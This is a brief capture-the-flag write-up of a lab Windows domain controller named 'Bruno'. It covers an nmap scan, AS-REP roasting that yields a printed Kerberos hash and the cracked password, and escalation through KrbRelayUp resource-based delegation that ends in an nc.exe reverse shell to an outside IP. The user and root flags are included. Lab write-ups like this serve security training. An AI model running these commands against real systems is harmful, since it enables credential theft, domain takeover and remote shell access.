Scan : 
```sh
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
| ftp-syst:
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 06-29-22  04:55PM       <DIR>          app
| 06-29-22  04:33PM       <DIR>          benign
| 06-29-22  01:41PM       <DIR>          malicious
|_06-29-22  04:33PM       <DIR>          queue
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| http-methods:
|_  Potentially risky methods: TRACE
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-08-14 13:58:09Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: bruno.vl0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=brunodc.bruno.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:brunodc.bruno.vl
| Not valid before: 2023-08-22T06:05:15
|_Not valid after:  2024-08-21T06:05:15
|_ssl-date: 2024-08-14T13:59:29+00:00; 0s from scanner time.
443/tcp  open  ssl/http      Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_ssl-date: TLS randomness does not represent time
|_http-title: IIS Windows Server
| tls-alpn:
|_  http/1.1
| ssl-cert: Subject: commonName=bruno-BRUNODC-CA
| Not valid before: 2022-06-29T13:23:01
|_Not valid after:  2121-06-29T13:33:00
| http-methods:
|_  Potentially risky methods: TRACE
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap
| ssl-cert: Subject: commonName=brunodc.bruno.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:brunodc.bruno.vl
| Not valid before: 2023-08-22T06:05:15
|_Not valid after:  2024-08-21T06:05:15
|_ssl-date: 2024-08-14T13:59:29+00:00; 0s from scanner time.
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: bruno.vl0., Site: Default-First-Site-Name)
|_ssl-date: 2024-08-14T13:59:29+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=brunodc.bruno.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:brunodc.bruno.vl
| Not valid before: 2023-08-22T06:05:15
|_Not valid after:  2024-08-21T06:05:15
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: bruno.vl0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=brunodc.bruno.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:brunodc.bruno.vl
| Not valid before: 2023-08-22T06:05:15
|_Not valid after:  2024-08-21T06:05:15
|_ssl-date: 2024-08-14T13:59:29+00:00; 0s from scanner time.
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2024-08-14T13:59:29+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=brunodc.bruno.vl
| Not valid before: 2024-08-13T13:54:38
|_Not valid after:  2025-02-12T13:54:38
| rdp-ntlm-info:
|   Target_Name: BRUNO
|   NetBIOS_Domain_Name: BRUNO
|   NetBIOS_Computer_Name: BRUNODC
|   DNS_Domain_Name: bruno.vl
|   DNS_Computer_Name: brunodc.bruno.vl
|   DNS_Tree_Name: bruno.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2024-08-14T13:58:49+00:00
5357/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Service Unavailable
Service Info: Host: BRUNODC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2024-08-14T13:58:52
|_  start_date: N/A
| smb2-security-mode:
|   311:
|_    Message signing enabled and required

```

- We read the the changelog in the FTP and discover the user `svc_scan`

- Try to get a hash from that user :
```sh
GetNPUsers.py bruno.vl/ -usersfile usernames.txt -format john -outputfile hashes.asreproast
```

```sh
$krb5asrep$svc_scan@BRUNO.VL:03f3f1d743b9cf6d30349c8685c4ec37$7eaf7c3f544d5cead697bdd919900a5cc10c5558d3ce22afbffdc7ec7030b8bd0aa4b84986f48b4774b1686e2464832f8636298d638d5483d91d22a8ef2d65899135825b44506d0296267b9f1561565842305b32078403ad08dd5cd7762ed41a58d92856e9306012f44c517e1e00b985190500f930372dc1547c278655cf7f566c8a84f0ca3995fb01b33b705e270936a76903fe530fc6abac1f06c5bad66ac289a877ccb0d5340a61c5fde2ecc9ae5812e2621c36441c1a2c785dd87b2bf4f0d7643c0d3002807a099f58682e132cb3a525d6b63a1203aadaa708c851685625b8106353

Sunshine1        ($krb5asrep$svc_scan@BRUNO.VL)
```

- Reverse the binary and we observe that we can do an Path traversal to dll hijacking with Zzip

user VL{6efd85f20df80e14a0452381657809e4}

- **Krbrelayup :**

- Check if exploitable LDAP signing : 
```sh
$ldapSigningSetting = Get-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Parameters' -Name 'LDAPServerIntegrity'

$ldapSigningSetting.LDAPServerIntegrity

nxc ldap <ip> -u user -p pass -M ldap-checker
netexec ldap brunodc.bruno.vl -u "svc_scan" -p "Sunshine1" -M maq
#MachineAccountQuota: 10
```

- Exploit with a tool : 
```powershell
.\KrbRelayUp.exe relay brunodc.bruno.vl -CreateNewComputerAccount -ComputerName pwned$ -ComputerPassword P@ssword1234 -cls <CLS>
```

```powershell
./KrbRelayUp spawn -m rbcd --DomainController brunodc.bruno.vl -cn pwned$ -cp P@ssword1234 --sc "C:\Users\svc_scan\Documents\nc.exe 10.8.3.12 4242 -e cmd"
```

Root: VL{b528ba689d85ca396374c0f186087a7d}

- Ressources : 

https://github.com/Dec0ne/KrbRelayUp?tab=readme-ov-file
https://gist.github.com/tothi/bf6c59d6de5d0c9710f23dae5750c4b9
https://github.com/ohpe/juicy-potato/tree/master/CLSID